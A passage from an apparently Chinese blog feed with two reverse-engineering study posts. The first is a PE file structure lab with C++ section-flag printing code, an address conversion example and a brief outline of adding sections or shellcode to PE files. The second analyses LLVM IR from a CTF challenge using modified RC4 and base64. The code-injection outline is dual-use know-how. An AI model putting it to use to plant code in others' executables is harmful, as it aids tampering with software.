class="number">0</span>);</span><br><span class="line">    l_flag.<span class="built_in">push_back</span>((l_Charctieristics &gt;&gt; <span class="number">5</span>) &amp; <span class="number">1</span> ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//高位</span></span><br><span class="line">    h_flag.<span class="built_in">push_back</span>((h_Charctieristics &gt;&gt; <span class="number">7</span>) ? <span class="number">7</span> : <span class="number">0</span>);</span><br><span class="line">    h_flag.<span class="built_in">push_back</span>((h_Charctieristics &gt;&gt; <span class="number">6</span>) &amp; <span class="number">1</span> ? <span class="number">6</span> : <span class="number">0</span>);</span><br><span class="line">    h_flag.<span class="built_in">push_back</span>((h_Charctieristics &gt;&gt; <span class="number">5</span>) &amp; <span class="number">1</span> ? <span class="number">5</span> : <span class="number">0</span>);</span><br><span class="line">    h_flag.<span class="built_in">push_back</span>((h_Charctieristics &gt;&gt; <span class="number">4</span>) &amp; <span class="number">1</span> ? <span class="number">4</span> : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//包含数据情况</span></span><br><span class="line">    <span class="built_in">SetConsoleTextAttribute</span>(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);</span><br><span class="line">    <span class="keyword">for</span> (vector&lt;byte&gt;::iterator iter = l_flag.<span class="built_in">begin</span>(); iter != l_flag.<span class="built_in">end</span>(); iter++)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">switch</span> (*iter)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                cout &lt;&lt; <span class="string">"(包含可执行代码),"</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                cout &lt;&lt; <span class="string">"(包含已初始化数据),"</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                cout &lt;&lt; <span class="string">"(包含未初始化数据),"</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">//可读写执行情况</span></span><br><span class="line">    <span class="keyword">for</span> (vector&lt;byte&gt;::iterator iter = h_flag.<span class="built_in">begin</span>(); iter != h_flag.<span class="built_in">end</span>(); iter++)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">switch</span> (*iter)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                cout &lt;&lt; <span class="string">"(共享),"</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                cout &lt;&lt; <span class="string">"(可执行),"</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                cout &lt;&lt; <span class="string">"(可读),"</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                cout &lt;&lt; <span class="string">"(可写),"</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    cout &lt;&lt; endl &lt;&lt; endl;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SetConsoleTextAttribute</span>(handle, <span class="number">0x07</span>);</span><br><span class="line">}</span><br><span class="line"><span class="built_in">SetConsoleTextAttribute</span>(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"--&gt; 标志(属性块) 常用特征值对照表：&lt;--\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[值:00000020h](*包含可执行代码)\n"</span>);<span class="comment">//IMAGE_SCN_CNT_CODE</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[值:00000040h](*该块包含已初始化的数据)\n"</span>);<span class="comment">//IMAGE_SCN_CNT_INITIALIZED_DATA</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[值:00000080h](*该块包含未初始化的数据)\n"</span>);<span class="comment">//IMAGE_SCN_CNT_UNINITIALIZED_DATA</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[值:00000200h][Section contains comments or some other type of information.]\n"</span>);<span class="comment">//IMAGE_SCN_LNK_INFO</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[值:00000800h][Section contents will not become part of image.]\n"</span>);<span class="comment">//IMAGE_SCN_LNK_REMOVE</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[值:00001000h][Section contents comdat.]\n"</span>);<span class="comment">//IMAGE_SCN_LNK_COMDAT</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[值:00004000h][Reset speculative exceptions handling bits in the TLB entries for this section.]\n"</span>);<span class="comment">//IMAGE_SCN_NO_DEFER_SPEC_EXC</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[值:00008000h][Section content can be accessed relative to GP.]\n"</span>);<span class="comment">// IMAGE_SCN_GPREL</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[值:00500000h][Default alignment if no others are specified.]\n"</span>);<span class="comment">//IMAGE_SCN_ALIGN_16BYTES  </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[值:01000000h][Section contains extended relocations.]\n"</span>);<span class="comment">//IMAGE_SCN_LNK_NRELOC_OVFL</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[值:02000000h][Section can be discarded.]\n"</span>);<span class="comment">//IMAGE_SCN_MEM_DISCARDABLE</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[值:04000000h][Section is not cachable.]\n"</span>);<span class="comment">//IMAGE_SCN_MEM_NOT_CACHED</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[值:08000000h][Section is not pageable.]\n"</span>);<span class="comment">//IMAGE_SCN_MEM_NOT_PAGED</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[值:10000000h](*该块为共享块).\n"</span>);<span class="comment">//IMAGE_SCN_MEM_SHARED</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[值:20000000h](*该块可执行)\n"</span>);<span class="comment">//IMAGE_SCN_MEM_EXECUTE</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[值:40000000h](*该块可读)\n"</span>);<span class="comment">//IMAGE_SCN_MEM_READ</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[值:80000000h](*该块可写)\n\n"</span>);<span class="comment">// IMAGE_SCN_MEM_WRITE</span></span><br><span class="line"><span class="built_in">SetConsoleTextAttribute</span>(handle, <span class="number">0x07</span>);<span class="comment">//IMAGE_SCN_MEM_WRITE</span></span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/12/29/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84-%E5%AE%9E%E9%AA%8C/image-20250113135908304.png" alt="image-20250113135908304"> </p><h2 id="6-3-计算地址-地址转换"><a href="#6-3-计算地址-地址转换" class="headerlink" title="6.3 计算地址-地址转换"></a>6.3 计算地址-地址转换</h2><p>比如我们要找字符串<code>Hello World!</code>在文件中的偏移地址FOA</p><p><img src="/2024/12/29/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84-%E5%AE%9E%E9%AA%8C/image-20241231122829198.png" alt="image-20241231122829198"></p><p>我们发现该字符串的虚拟地址VA为0x00403006</p><p><img src="/2024/12/29/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84-%E5%AE%9E%E9%AA%8C/image-20241231122926122.png" alt="image-20241231122926122"></p><p>同时我们也知道每个节的VA，RVA，FOA。那么由此计算该字符串的FOA的方法如下：</p><ol><li><strong>计算</strong>内存中的相对起始地址<strong>RVA</strong> =虚拟地址VA - 装载地址 ，即0x00403006 - 0x00400000 = 0x00003006</li><li>找到RVA对应的<strong>节</strong>，由于.data的RVA为0x00003000，长度为0x00001000，所以该字符串对应的节为.data</li><li>计算.data的<strong>RVA和FOA的差值</strong>，即0x00003000 - 0x00000600 = 0x00002800(注意是16进制计算)</li><li>用该字符串的<strong>RVA减去该差值</strong>得到其FOA，即0x00003006 - 0x00002800 = 0x00000806。</li></ol><h1 id="7-节操作"><a href="#7-节操作" class="headerlink" title="7. 节操作"></a>7. 节操作</h1><h2 id="7-1-添加节-省流"><a href="#7-1-添加节-省流" class="headerlink" title="7.1 添加节-省流"></a>7.1 添加节-省流</h2><p>添加节可以是一种软件保护措施，比如把可执行代码写入一个甚至两个节中打到保护的目的。</p><p>添加节的一般步骤</p><ol><li>增加节表项 - 找到节位置，在最后一个节后面添加40字节</li><li>修正文件的映像长度 - 可选头的SizeOfImage + 0x1000</li><li>修正一个节的数量 - PE头的NumberOfSections <strong>+1</strong></li><li>增加文件的节数据 - 文件末尾 添加数据<br>即：IMAGE_OPTIONAL_HEADER.SizeOfImage;<br>IMAGE_FILE_HEADER.NumberOfSections;</li></ol><h2 id="7-2-节操作的几种（循序渐进）"><a href="#7-2-节操作的几种（循序渐进）" class="headerlink" title="7.2 节操作的几种（循序渐进）"></a>7.2 节操作的几种（循序渐进）</h2><ol><li>PE文件空白区添加代码（shellcode-战损）</li></ol><p>如果空白区不够用，怎么办？</p><ol start="2"><li><p>扩大节（弊端-最后一个节属性被修改,插入代码与原节数据混在一块）</p></li><li><p>新增节 (<strong>节表后至少有40字节空白区</strong>)</p></li><li><p>合并节</p></li></ol></body></html>]]></content>
      
      
      <categories>
          
          <category> 二进制学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LLVM IR研究分析</title>
      <link href="/2024/09/07/LLVM-IR-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/"/>
      <url>/2024/09/07/LLVM-IR-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><blockquote><p>LLVM是C++编写的构架编译器的框架系统，可用于优化以任意程序语言编写的程序。</p></blockquote><p>LLVM IR可以理解为LLVM平台的汇编语言，所以官方也是以语言参考手册(Language Reference Manual))的形式给出LLVM IR的文档说<br>明。既然是汇编语言，那么就和传统的CUP类似，有特定的汇编指令集。但是它又与传统的特定平台相关的指令集(x86,ARM,RISC-V等)<br>不一样，它定位为平台无关的汇编语言。也就是说，LLVM IR是一种相对于CUP指令集高级，但是又是一种低级的代码中间表示（比抽象语法树等高级表示更加低级)。</p><p>LLVM IR即代码的中间表示，有三种形式：</p><ul><li><strong>.ll 格式</strong>：人类可以阅读的文本(汇编码) –&gt;这个就是我们要<strong>学习</strong>的IR</li><li>.bc 格式：适合机器存储的二进制文件</li><li>内存表示</li></ul><p>下面给出.ll格式和.bc格式生成及相互转换的常用指令清单：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.c -&gt; .ll：clang -emit-llvm -S a.c -o a.ll</span><br><span class="line">.c -&gt; .bc: clang -emit-llvm -c a.c -o a.bc</span><br><span class="line">.ll -&gt; .bc: llvm-as a.ll -o a.bc</span><br><span class="line">.bc -&gt; .ll: llvm-dis a.bc -o a.ll</span><br><span class="line">.bc -&gt; .s: llc a.bc -o a.s</span><br></pre></td></tr></tbody></table></figure><p>那么我们以一道CTF赛题来分析实验，学习LLVM IR</p><h1 id="实验解析"><a href="#实验解析" class="headerlink" title="实验解析"></a>实验解析</h1><p>题目附件直接给出了中间表示.II文件</p><p><img src="/2024/09/07/LLVM-IR-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/1722612409999-2ecff9bb-f496-4e3a-b7a2-b028d8797274.png" alt="1"></p><p>打开查看一下汇编码，毕竟.II文件是人类可以阅读的文本，这边笔者使用的是Sublime Text（使用VScode查看即可）</p><p>代码量不多，大概600行<img src="/2024/09/07/LLVM-IR-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/1722613237042-a069ba03-099a-4278-ba5b-5a8db92232e7.png" alt="11"></p><h2 id="题目初步分析"><a href="#题目初步分析" class="headerlink" title="题目初步分析"></a>题目初步分析</h2><p>我们直接寻找一下main函数</p><p><img src="/2024/09/07/LLVM-IR-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/1722613830009-b53a568d-e591-4403-8364-cc9798178653.png" alt="22"></p><p><img src="/2024/09/07/LLVM-IR-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/1722613868311-6c07a5f8-1753-41bd-8003-2e6216e4fd70.png" alt="3"></p><p>我们可以看出题目经历了两次RC4，然后Base64，我们从上面可以看到密文，RC4_key,我们直接一把锁，cyberchef启动，会发现解不出来，那么程序应该做了其他的操作，最朴素的，我们可以想到把RC4魔改了，base64魔改等等。</p><p><img src="/2024/09/07/LLVM-IR-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/1722614166186-53dcfa02-0422-40a0-96f7-71350504fb65.png" alt="4"></p><p>So！继续学习研究ing</p><h2 id="II详细分析"><a href="#II详细分析" class="headerlink" title=".II详细分析"></a>.II详细分析</h2><p>所以本着学习的态度，我们这时候应该掏出<strong>LLVM</strong> <strong>Language Reference Manual</strong>(官方文档)来简单了解学习一些常见指令、符号标识以及特性。</p><p>这边给出一些分析 .ll 中间文件的算法流程</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@ - 全局变量</span><br><span class="line">% - 局部变量</span><br><span class="line">alloca - 在当前执行的函数的堆栈帧中分配内存，当该函数返回到其调用者时，将自动释放内存</span><br><span class="line">i32 - <span class="number">32</span>位<span class="number">4</span>字节的整数</span><br><span class="line">align - 对齐</span><br><span class="line">load - 读出，store写入</span><br><span class="line">icmp - 两个整数值比较，返回布尔值</span><br><span class="line">br - 选择分支，根据条件来转向label，不根据条件跳转的话类型<span class="keyword">goto</span></span><br><span class="line">label - 代码标签</span><br><span class="line">call - 调用函数</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>首先看到一些全局变量，知道了</p><p>RC4_key = llvmbitc</p><p>cipher = “TSz<code>kWKgbMHszXaj</code>@kLBmRrnTxsNtZsSOtZzqYikCw=”</p><p><img src="/2024/09/07/LLVM-IR-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/1722613418710-feb6484d-d3b7-400c-ac27-ad5da17e76f3.png" alt="5"></p><p>我们继续分析，重点分析各个function</p><h3 id="b64encode"><a href="#b64encode" class="headerlink" title="b64encode"></a>b64encode</h3><p>b64encode 魔改  </p><ol><li>每三个字符，24位，切分成4断，每段6位。</li><li>将6位对应的值 (value+ 59)&amp;0xff 则是编码后的值。</li></ol><p><img src="/2024/09/07/LLVM-IR-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/1722615679682-4a2bd024-94d7-4324-8c8e-b14bd80ef898.png" alt="6"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">22</span> = getelementptr inbounds i8, i8* %<span class="number">19</span>, i64 %<span class="number">21</span>        <span class="comment">// 取出当前处理字符</span></span><br><span class="line">%<span class="number">23</span> = load i8, i8* %<span class="number">22</span>, align <span class="number">1</span></span><br><span class="line">%<span class="number">24</span> = zext i8 %<span class="number">23</span> to i32                                 <span class="comment">// 类型强制转化</span></span><br><span class="line">%<span class="number">25</span> = ashr i32 %<span class="number">24</span>, <span class="number">2</span>                                   <span class="comment">// 算数右移两位   input[i]&gt;&gt;2</span></span><br><span class="line">%<span class="number">26</span> = add nsw i32 %<span class="number">25</span>, <span class="number">59</span>                                 <span class="comment">//    input[i]+59</span></span><br><span class="line">%<span class="number">27</span> = trunc i32 %<span class="number">26</span> to i8                                <span class="comment">//    强制转化  相当于 &amp;0xff</span></span><br><span class="line">%<span class="number">28</span> = load i8*, i8** %<span class="number">6</span>, align <span class="number">8</span></span><br><span class="line">%<span class="number">29</span> = load i32, i32* %<span class="number">9</span>, align <span class="number">4</span></span><br><span class="line">%<span class="number">30</span> = sext i32 %<span class="number">29</span> to i64</span><br><span class="line">%<span class="number">31</span> = getelementptr inbounds i8, i8* %<span class="number">28</span>, i64 %<span class="number">30</span>        <span class="comment">// 存储base64 编码串</span></span><br><span class="line">store i8 %<span class="number">27</span>, i8* %<span class="number">31</span>, align <span class="number">1</span></span><br><span class="line">%<span class="number">32</span> = load i8*, i8** %<span class="number">4</span>, align <span class="number">8</span></span><br><span class="line">%<span class="number">33</span> = load i32, i32* %<span class="number">7</span>, align <span class="number">4</span></span><br><span class="line">%<span class="number">34</span> = sext i32 %<span class="number">33</span> to i64</span><br><span class="line">%<span class="number">35</span> = getelementptr inbounds i8, i8* %<span class="number">32</span>, i64 %<span class="number">34</span></span><br><span class="line">%<span class="number">36</span> = load i8, i8* %<span class="number">35</span>, align <span class="number">1</span></span><br><span class="line">%<span class="number">37</span> = zext i8 %<span class="number">36</span> to i32</span><br><span class="line">%<span class="number">38</span> = and i32 %<span class="number">37</span>, <span class="number">3</span>                              <span class="comment">// 获取第一个字符 低两位</span></span><br><span class="line">%<span class="number">39</span> = shl i32 %<span class="number">38</span>, <span class="number">4</span>                                <span class="comment">// 左移四位</span></span><br></pre></td></tr></tbody></table></figure><h3 id="RC4-init"><a href="#RC4-init" class="headerlink" title="RC4_init"></a>RC4_init</h3><p>RC4_init 正常，无魔改</p><p><img src="/2024/09/07/LLVM-IR-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/1722614946387-e49d88a3-dd7c-468e-950b-f8156faa6065.png" alt="7"></p><p><img src="/2024/09/07/LLVM-IR-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/1722614991447-9fe4acbf-16e5-4ac9-87c5-33612943b1d2.png" alt="8"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">define dso_local <span class="type">void</span> @Rc4_Init(i8*, i32) #<span class="number">0</span> {                           <span class="comment">//RC4_init function</span></span><br><span class="line">  %<span class="number">3</span> = alloca i8*, align <span class="number">8</span></span><br><span class="line">  %<span class="number">4</span> = alloca i32, align <span class="number">4</span></span><br><span class="line">  %<span class="number">5</span> = alloca i32, align <span class="number">4</span></span><br><span class="line">  %<span class="number">6</span> = alloca i32, align <span class="number">4</span></span><br><span class="line">  store i8* %<span class="number">0</span>, i8** %<span class="number">3</span>, align <span class="number">8</span></span><br><span class="line">  store i32 %<span class="number">1</span>, i32* %<span class="number">4</span>, align <span class="number">4</span>                                         <span class="comment">//初始化S，T盒</span></span><br><span class="line">  call <span class="type">void</span> @llvm.<span class="built_in">memset</span>.p0i8.i64(i8* align <span class="number">16</span> getelementptr inbounds ([<span class="number">256</span> x i8], [<span class="number">256</span> x i8]* @s, i64 <span class="number">0</span>, i64 <span class="number">0</span>), i8 <span class="number">0</span>, i64 <span class="number">256</span>, i1 <span class="literal">false</span>)</span><br><span class="line">  call <span class="type">void</span> @llvm.<span class="built_in">memset</span>.p0i8.i64(i8* align <span class="number">16</span> getelementptr inbounds ([<span class="number">256</span> x i8], [<span class="number">256</span> x i8]* @t, i64 <span class="number">0</span>, i64 <span class="number">0</span>), i8 <span class="number">0</span>, i64 <span class="number">256</span>, i1 <span class="literal">false</span>)</span><br><span class="line">  store i32 <span class="number">0</span>, i32* %<span class="number">5</span>, align <span class="number">4</span></span><br><span class="line">  br label %<span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="number">7</span>:                                                ; preds = %<span class="number">26</span>, %<span class="number">2</span></span><br><span class="line">  %<span class="number">8</span> = load i32, i32* %<span class="number">5</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">9</span> = icmp slt i32 %<span class="number">8</span>, <span class="number">256</span></span><br><span class="line">  br i1 %<span class="number">9</span>, label %<span class="number">10</span>, label %<span class="number">29</span>                          <span class="comment">//如果 %9 为真（即 %8 小于 256），跳转到标签 %10；否则跳转到标签 %29，根据t打乱s盒</span></span><br><span class="line"></span><br><span class="line"><span class="number">10</span>:                                               ; preds = %<span class="number">7</span></span><br><span class="line">  %<span class="number">11</span> = load i32, i32* %<span class="number">5</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">12</span> = trunc i32 %<span class="number">11</span> to i8</span><br><span class="line">  %<span class="number">13</span> = load i32, i32* %<span class="number">5</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">14</span> = sext i32 %<span class="number">13</span> to i64</span><br><span class="line">  %<span class="number">15</span> = getelementptr inbounds [<span class="number">256</span> x i8], [<span class="number">256</span> x i8]* @s, i64 <span class="number">0</span>, i64 %<span class="number">14</span></span><br><span class="line">  store i8 %<span class="number">12</span>, i8* %<span class="number">15</span>, align <span class="number">1</span></span><br><span class="line">  %<span class="number">16</span> = load i8*, i8** %<span class="number">3</span>, align <span class="number">8</span></span><br><span class="line">  %<span class="number">17</span> = load i32, i32* %<span class="number">5</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">18</span> = load i32, i32* %<span class="number">4</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">19</span> = urem i32 %<span class="number">17</span>, %<span class="number">18</span></span><br><span class="line">  %<span class="number">20</span> = zext i32 %<span class="number">19</span> to i64</span><br><span class="line">  %<span class="number">21</span> = getelementptr inbounds i8, i8* %<span class="number">16</span>, i64 %<span class="number">20</span></span><br><span class="line">  %<span class="number">22</span> = load i8, i8* %<span class="number">21</span>, align <span class="number">1</span></span><br><span class="line">  %<span class="number">23</span> = load i32, i32* %<span class="number">5</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">24</span> = sext i32 %<span class="number">23</span> to i64</span><br><span class="line">  %<span class="number">25</span> = getelementptr inbounds [<span class="number">256</span> x i8], [<span class="number">256</span> x i8]* @t, i64 <span class="number">0</span>, i64 %<span class="number">24</span></span><br><span class="line">  store i8 %<span class="number">22</span>, i8* %<span class="number">25</span>, align <span class="number">1</span></span><br><span class="line">  br label %<span class="number">26</span></span><br><span class="line"></span><br><span class="line"><span class="number">26</span>:                                               ; preds = %<span class="number">10</span></span><br><span class="line">  %<span class="number">27</span> = load i32, i32* %<span class="number">5</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">28</span> = add nsw i32 %<span class="number">27</span>, <span class="number">1</span></span><br><span class="line">  store i32 %<span class="number">28</span>, i32* %<span class="number">5</span>, align <span class="number">4</span></span><br><span class="line">  br label %<span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="number">29</span>:                                               ; preds = %<span class="number">7</span></span><br><span class="line">  store i32 <span class="number">0</span>, i32* %<span class="number">6</span>, align <span class="number">4</span></span><br><span class="line">  store i32 <span class="number">0</span>, i32* %<span class="number">5</span>, align <span class="number">4</span></span><br><span class="line">  br label %<span class="number">30</span></span><br><span class="line"></span><br><span class="line"><span class="number">30</span>:                                               ; preds = %<span class="number">54</span>, %<span class="number">29</span></span><br><span class="line">  %<span class="number">31</span> = load i32, i32* %<span class="number">5</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">32</span> = icmp slt i32 %<span class="number">31</span>, <span class="number">256</span></span><br><span class="line">  br i1 %<span class="number">32</span>, label %<span class="number">33</span>, label %<span class="number">57</span></span><br><span class="line"></span><br><span class="line"><span class="number">33</span>:                                               ; preds = %<span class="number">30</span></span><br><span class="line">  %<span class="number">34</span> = load i32, i32* %<span class="number">6</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">35</span> = load i32, i32* %<span class="number">5</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">36</span> = sext i32 %<span class="number">35</span> to i64</span><br><span class="line">  %<span class="number">37</span> = getelementptr inbounds [<span class="number">256</span> x i8], [<span class="number">256</span> x i8]* @s, i64 <span class="number">0</span>, i64 %<span class="number">36</span></span><br><span class="line">  %<span class="number">38</span> = load i8, i8* %<span class="number">37</span>, align <span class="number">1</span></span><br><span class="line">  %<span class="number">39</span> = zext i8 %<span class="number">38</span> to i32</span><br><span class="line">  %<span class="number">40</span> = add nsw i32 %<span class="number">34</span>, %<span class="number">39</span></span><br><span class="line">  %<span class="number">41</span> = load i32, i32* %<span class="number">5</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">42</span> = sext i32 %<span class="number">41</span> to i64</span><br><span class="line">  %<span class="number">43</span> = getelementptr inbounds [<span class="number">256</span> x i8], [<span class="number">256</span> x i8]* @t, i64 <span class="number">0</span>, i64 %<span class="number">42</span></span><br><span class="line">  %<span class="number">44</span> = load i8, i8* %<span class="number">43</span>, align <span class="number">1</span></span><br><span class="line">  %<span class="number">45</span> = zext i8 %<span class="number">44</span> to i32</span><br><span class="line">  %<span class="number">46</span> = add nsw i32 %<span class="number">40</span>, %<span class="number">45</span></span><br><span class="line">  %<span class="number">47</span> = srem i32 %<span class="number">46</span>, <span class="number">256</span></span><br><span class="line">  store i32 %<span class="number">47</span>, i32* %<span class="number">6</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">48</span> = load i32, i32* %<span class="number">5</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">49</span> = sext i32 %<span class="number">48</span> to i64</span><br><span class="line">  %<span class="number">50</span> = getelementptr inbounds [<span class="number">256</span> x i8], [<span class="number">256</span> x i8]* @s, i64 <span class="number">0</span>, i64 %<span class="number">49</span></span><br><span class="line">  %<span class="number">51</span> = load i32, i32* %<span class="number">6</span>, align <span class="number">4</span></span><br><span class="line">  %<span class="number">52</span> = sext i32 %<span class="number">51</span> to i64</span><br><span class="line">  %<span class="number">53</span> = getelementptr inbounds [<span class="number">256</span> x i8], [<span class="number">256</span> x i8]* @s, i64 <span class="number">0</span>, i64 %<span class="number">52</span></span><br><span class="line">  call <span class="type">void</span> @swap(i8* %<span class="number">50</span>, i8* %<span class="number">53</span>)                                                <span class="comment">//call swap function</span></span><br><span class="line">  br label %<span class="number">54</span></span><br></pre></td></tr></tbody></table></figure><h3 id="RC4-enc"><a href="#RC4-enc" class="headerlink" title="RC4_enc"></a>RC4_enc</h3><p>RC4_enc  魔改  多了一层xor 89</p><p><img src="/2024/09/07/LLVM-IR-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/1722615152574-989ca9a3-d828-461c-ac7d-4e55aaaca7aa.png" alt="9"><img src="/2024/09/07/LLVM-IR-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/1722615256051-2b7b6ac3-dc58-4308-adda-a53350a203e6.png" alt="11"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 